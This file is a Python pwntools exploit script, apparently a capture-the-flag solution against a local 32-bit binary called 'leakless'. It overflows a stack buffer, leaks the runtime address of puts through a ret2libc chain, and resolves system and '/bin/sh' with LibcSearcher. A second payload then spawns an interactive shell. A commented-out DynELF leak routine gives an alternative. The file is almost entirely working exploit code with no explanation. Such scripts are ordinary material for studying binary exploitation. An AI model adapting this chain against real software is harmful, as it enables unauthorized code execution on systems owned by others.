from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
sh = process('./leakless')
libc = ELF('./leakless')

#def leak(addr):
#	pay = 'a'*0x48 + 'bbbb' + p32(libc.symbols['puts'])+p32(libc.symbols['main']) +p32(addr)
#	sh.send(pay)
#	data= sh.recv(4)
#	return data
#
#d = DynELF(leak,elf = ELF('./leakless'))  
#sys_add = d.lookup('system','libc')  

pay = 'a'*0x48 + 'bbbb' + p32(libc.symbols['puts'])+p32(libc.symbols['feedme']) +p32(libc.got['puts'])
sh.sendline(pay)
puts_got_addr = u32(sh.recv(4))
print "puts_got_addr: "+hex(puts_got_addr)

obj = LibcSearcher("puts",puts_got_addr)

system_addr = puts_got_addr - obj.dump('puts')+obj.dump("system")
binsh_addr = puts_got_addr - obj.dump('puts') + obj.dump("str_bin_sh")
 
success( "system_addr: "+hex(system_addr))
success("binsh_addr: "+hex(binsh_addr))

pay = 'a'*0x48 + 'bbbb' + p32(system_addr) + p32(libc.symbols['main']) + p32(binsh_addr)
#gdb.attach(sh)
sh.sendline(pay)
sh.interactive()
